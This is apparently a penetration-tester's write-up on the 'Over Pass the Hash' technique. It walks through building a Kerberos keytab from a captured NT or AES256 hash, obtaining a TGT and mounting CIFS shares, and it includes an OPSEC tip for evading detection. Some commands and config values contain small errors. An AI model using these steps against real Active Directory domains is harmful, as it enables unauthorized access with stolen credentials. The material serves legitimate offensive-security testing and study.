---
title: Over Pass the Hash (OPtH)
description: Initialize Kerberos from a NT hash
date: 2024-04-16
---

# Over Pass the Hash (OPtH)

## Objective

During internal engagement, it is common to end up with the NT hash of a user. The following article will show how to use that hash to configure Kerberos authentication.

Furthermore, we'll use that Kerberos authentication to mount CIFS shares.

### References

Special thanks to [Exorcyst](http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html), [n00py](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/) and [ropnp](https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf)! I would not have figured out how do it without them.

## Configuration

> I'm using an LXD container running Debian 10
>
> ```shell
> # container has to be privileged to mount.cifs
> $ incus launch images:debian/10 -c security.privileged=true pth-kerberos
> ```

Install the required package:

```shell
$ sudo apt-get install heimdal-client
```

Configure `/etc/krb5.conf`

```
[libdefaults]
        default_realm = EXAMPLE.COM

        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

        fcc-mit-ticketflags = true

[realms]
        LAB.BREAKME.CA = {
                kdc = DC.EXAMPLE.COM
                admin_server = DC.EXAMPLE.COM
        }
```

Create `/etc/krb5.keytab`

> Kerberos wants all caps

```shell
# NT hash
$ sudo ktutil.heimdal -k /etc/krb5.keytab add -p <username@FQDN> -e arcfour-hmac-md5 -w <NT hash> --hex -V 5
# For better OPSEC, use AES256
$ sudo ktutil.heimdal -k /etc/krb5.keytab add -p <username@FQDN> -e aes256-cts-hmac-sha1-96 w <aes256 hash> --hex -V 5
```

Get a TGT

```shell
$ kinit.heimdal -t /etc/krb5.keytab <username>@<FQDN>
```

Mount a CIFS share using Kerberos

```shell
$ mount -t cifs -o sec=krb5,vers=2.1, '//<FQDN of server>/<share name>' <mountpoint> -vv
```

